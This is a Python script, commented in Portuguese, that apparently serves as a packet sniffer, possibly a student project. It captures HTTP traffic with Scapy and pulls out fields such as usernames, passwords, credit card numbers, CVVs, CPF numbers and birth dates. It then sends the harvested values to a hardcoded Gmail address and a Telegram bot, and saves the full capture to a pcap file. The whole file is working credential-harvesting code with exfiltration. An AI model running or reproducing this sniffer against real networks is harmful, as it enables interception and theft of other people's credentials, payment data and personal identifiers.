import os
import smtplib
import requests
from scapy.all import *  # Importa todas as funcionalidades do Scapy
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse  # Importa classes específicas relacionadas ao protocolo HTTP do Scapy
from urllib import parse  # Importa o módulo parse do urllib para manipulação de URLs
import tkinter as tk  # Importa a biblioteca tkinter para criar interfaces gráficas
from tkinter import messagebox, scrolledtext  # Importa classes específicas do tkinter para caixas de mensagem e áreas de texto
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv

# Carregar variáveis de ambiente do arquivo .env
load_dotenv()

# Defina a interface de rede a ser usada para captura
interface = "wlp4s0"

# Função para filtrar pacotes HTTP que contenham dados brutos (Raw)
def filter_HTTP(pkt):
    return pkt.haslayer(HTTPRequest) or pkt.haslayer(HTTPResponse)

# Conjunto de dados sensíveis a serem procurados nos pacotes capturados
SENSITIVE_DATA = {
    "username", "user", "nome", "user name", "fname", "lname", "sobrenome",
    "middleName","lastName","initials","gender","sex","initials","mailingAddress",
    "password", "pass", "pwd", "passwd", "senha","country","pais",
    "login", "phone", "telefone", "celphone", "celular",
    "cc", "credit card", "card number", "card num", "creditcard",
    "cvv", "cvc", "security code", "sec code", "cvv code",
    "cpf", "CPF", "C.P.F.",
    "email", "e-mail", "mail",
    "birth date", "birthdate", "date of birth", "bday", "birth day", "data de nasc",
    "aniversario",
}

# Diretório para salvar a captura de pacotes
current_dir = os.path.dirname(os.path.abspath(__file__))

# Concatena o diretório atual do arquivo com um subdiretório chamado 'captures' para salvar as capturas
save_dir = os.path.join(current_dir, "captures")

# Cria o diretório 'captures' se ele não existir
os.makedirs(save_dir, exist_ok=True)

# Função para exibir uma janela pop-up com uma mensagem
def show_popup(message):
    popup = tk.Tk()  # Cria uma janela pop-up
    popup.title("Dados Sensíveis Capturados")  # Define o título da janela

    frame = tk.Frame(popup)  # Cria um frame na janela pop-up
    frame.pack(padx=10, pady=10)  # Empacota o frame com margens

    # Ícone de aviso
    icon_label = tk.Label(frame, text="⚠️", font=("Arial", 20), fg="red")  # Cria um rótulo com o ícone de aviso
    icon_label.pack(side=tk.LEFT, padx=5)  # Posiciona o rótulo no frame com margem à esquerda

    # Cria uma área de texto com barra de rolagem
    text_area = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=20)  # Cria uma área de texto com barra de rolagem
    text_area.pack(side=tk.LEFT, padx=5)  # Posiciona a área de texto no frame com margem à esquerda
    text_area.insert(tk.END, message)  # Insere a mensagem na área de texto
    text_area.config(state=tk.DISABLED)  # Torna o texto apenas para leitura

    # Cria um botão "OK" para fechar a janela pop-up
    ok_button = tk.Button(popup, text="OK", command=popup.destroy)  # Cria um botão com comando para destruir a janela
    ok_button.pack(pady=5)  # Empacota o botão com margem acima

    popup.mainloop()  # Inicia o loop principal da janela pop-up

# Função para enviar um e-mail
def send_email(subject, body, to_email):
    from_email = os.getenv('EMAIL_ADDRESS')
    password = os.getenv('EMAIL_PASSWORD')

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print("Email enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar email: {str(e)}")

# Função para enviar uma mensagem pelo Telegram
def send_telegram_message(message):
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    chat_id = os.getenv('TELEGRAM_CHAT_ID')
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}

    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Mensagem enviada pelo Telegram com sucesso!")
        else:
            print(f"Falha ao enviar mensagem pelo Telegram: {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar mensagem pelo Telegram: {str(e)}")

print("Captura iniciada...")

# Captura pacotes da interface especificada, filtrando aqueles relacionados ao protocolo HTTP
packets = sniff(iface=interface, count=15, lfilter=filter_HTTP)

# Lista para armazenar todos os dados sensíveis encontrados mantendo a ordem de captura
all_sensitive_data_found = []

# Itera sobre os pacotes capturados
for pkt in packets:
    print("-" * 40)
    print("*Pacote capturado:*")
    url = ""
    method = ""
    local_sensitive_data_found = []

    if pkt.haslayer(HTTPRequest):  # Verifica se o pacote é uma requisição HTTP
        http_request = pkt[HTTPRequest]  # Obtém a parte de requisição HTTP do pacote
        host = http_request.Host.decode()  # Decodifica o host da requisição HTTP
        path = http_request.Path.decode()  # Decodifica o caminho da requisição HTTP
        url = parse.unquote(host + path)  # Forma a URL completa decodificando o host e o caminho
        method = http_request.Method.decode()  # Decodifica o método da requisição HTTP

        if method == "GET":  # Se a requisição for do tipo GET
            if Raw in pkt:  # Se houver dados brutos no pacote
                load = pkt[Raw].load.decode(errors='ignore')  # Decodifica os dados brutos
                print(f"Raw GET data: {load}")  # Imprime os dados brutos
                query_params = parse.parse_qs(load)  # Analisa os parâmetros da consulta (query parameters)
                for key, values in query_params.items():  # Itera sobre os parâmetros e seus valores
                    if key in SENSITIVE_DATA:  # Verifica se o parâmetro é sensível
                        for value in values:  # Itera sobre os valores do parâmetro
                            local_sensitive_data_found.append((url, f"{key}={value}"))  # Adiciona os dados sensíveis à lista local

        if method == "POST" and Raw in pkt:  # Se a requisição for do tipo POST e houver dados brutos no pacote
            load = pkt[Raw].load.decode(errors='ignore')  # Decodifica os dados brutos
            print(f"Raw POST data: {load}")  # Imprime os dados brutos
            post_data = parse.parse_qs(load)  # Analisa os dados da requisição POST
            for key, values in post_data.items():  # Itera sobre os dados da requisição POST
                if key in SENSITIVE_DATA:  # Verifica se a chave é sensível
                    for value in values:  # Itera sobre os valores
                        local_sensitive_data_found.append((url, f"{key}={value}"))  # Adiciona os dados sensíveis à lista local

    elif pkt.haslayer(HTTPResponse) and Raw in pkt:  # Se o pacote for uma resposta HTTP e houver dados brutos no pacote
        load = pkt[Raw].load.decode(errors='ignore')  # Decodifica os dados brutos
        print(f"Raw HTTP Response data: {load}")  # Imprime os dados brutos
        for value in SENSITIVE_DATA:  # Itera sobre os dados sensíveis
            if value in load:  # Verifica se o dado sensível está presente na carga útil
                local_sensitive_data_found.append((url, f"{value}={load.split(value)[1].split('&')[0]}"))  # Adiciona os dados sensíveis à lista local

    # Acumular resultados mantendo a ordem
    if local_sensitive_data_found:  # Se foram encontrados dados sensíveis neste pacote
        all_sensitive_data_found.append((url, local_sensitive_data_found))  # Adiciona os dados sensíveis à lista global mantendo a ordem

    # Exibir dados no terminal
    if local_sensitive_data_found:  # Se foram encontrados dados sensíveis neste pacote
        print(f"Resultado: \nURL: {url}\nDados sensíveis desprotegidos capturados:")
        for _, sensitive_data in local_sensitive_data_found:  # Itera sobre os dados sensíveis locais
            print(sensitive_data)  # Imprime os dados sensíveis

# Exibir todos os dados capturados em um único popup mantendo a ordem
if all_sensitive_data_found:  # Se foram encontrados dados sensíveis em qualquer pacote
    final_message = ""  # Inicializa a mensagem final
    for url, data_list in all_sensitive_data_found:  # Itera sobre os dados sensíveis encontrados
        final_message += "-" * 40 + "\n"  # Adiciona uma linha de separação
        final_message += f"URL: {url}\nDados sensíveis desprotegidos capturados:\n"  # Adiciona a URL e um cabeçalho à mensagem final
        for _, sensitive_data in data_list:  # Itera sobre os dados sensíveis locais
            final_message += f"{sensitive_data}\n"  # Adiciona os dados sensíveis à mensagem final
        final_message += "\n"  # Adiciona uma linha em branco

    show_popup(final_message)  # Exibe uma janela pop-up com a mensagem final
    send_email("Dados Sensíveis Capturados", final_message, "sniffertuiuti@gmail.com")  # Envia um e-mail com os dados sensíveis
    send_telegram_message(final_message)  # Envia uma mensagem pelo Telegram com os dados sensíveis
else:  # Se nenhum dado sensível foi capturado
    show_popup("Nenhum dado sensível capturado.")  # Exibe uma janela pop-up informando que nenhum dado sensível foi capturado

print("*Captura finalizada!*")  # Imprime uma mensagem indicando que a captura foi finalizada

# Salvar a captura completa dos pacotes em um arquivo pcap
filename = "captura_completa.pcap"  # Nome do arquivo de captura
filepath = os.path.join(save_dir, filename)  # Caminho completo para o arquivo de captura
wrpcap(filepath, packets)  # Salva os pacotes capturados em um arquivo pcap

print(f"**Captura salva: {filepath}")  # Imprime uma mensagem indicando que a captura foi salva com sucesso
print("...Captura finalizada!")  # Imprime uma mensagem indicando que a captura foi finalizada